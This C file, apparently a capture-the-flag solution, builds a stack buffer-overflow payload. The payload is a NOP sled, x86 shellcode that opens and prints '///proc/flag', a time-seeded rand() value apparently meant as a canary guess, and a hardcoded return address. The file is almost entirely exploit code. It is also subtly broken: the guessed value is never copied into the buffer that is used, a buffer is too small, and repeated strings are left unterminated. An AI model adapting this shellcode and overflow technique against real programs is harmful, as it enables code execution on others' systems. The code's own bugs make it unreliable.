#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#define MAX 50
void jump_rand(char * hexres)
{
	unsigned int store = time(0);
        srand(store);
	unsigned int res = rand();
        printf("time = %d value = %d\n",store,res);
        int i = 0;
        for(;i<MAX;i++)
        {
                store++;
                srand(store);
                printf("time = %d value = %d\n",store,rand());
        }
	char temp[8];
	sprintf(temp,"%x",res);
	printf("%s\n",temp);
}

 
char *sconcat(const char *s1, const char *s2)
{
  char *s0 = malloc(strlen(s1)+strlen(s2)+1);
  strcpy(s0, s1);
  strcat(s0, s2);
  return s0;
}
 
char * string_repeat( int n, const char * s ) {
  size_t slen = strlen(s);
  char * dest = malloc(n*slen);
  int i; char * p;
  for ( i=0, p = dest; i < n; ++i, p += slen ) {
    memcpy(p, s, slen);
  }
  return dest;
}

char shellcode[] = "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x31\xc0\x50\x68\x66\x6c\x61\x67\x68\x72\x6f\x63\x2f\x68\x2f\x2f\x2f\x70\x89\xe3\xb0\x05\xcd\x80\x89\xc6\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xd2\x39\xc2\x74\x0d\xb2\x01\xb0\x04\xb3\x01\xcd\x80\x83\xc4\x01\xeb\xdf\x31\xdb\xb0\x01\xcd\x80";
int main(int argc, char * argv[])
{

	char *nop = string_repeat(183,"\x90");
	char * first = sconcat(nop, shellcode);
	char hexres[8];
	jump_rand(hexres);
	char * second = sconcat(first,hexres);
	char * third = sconcat(second,string_repeat(8,"\x90"));
	printf("%s",sconcat(third,"\xac\xf4\xff\xbf"));	
	return 0;
}
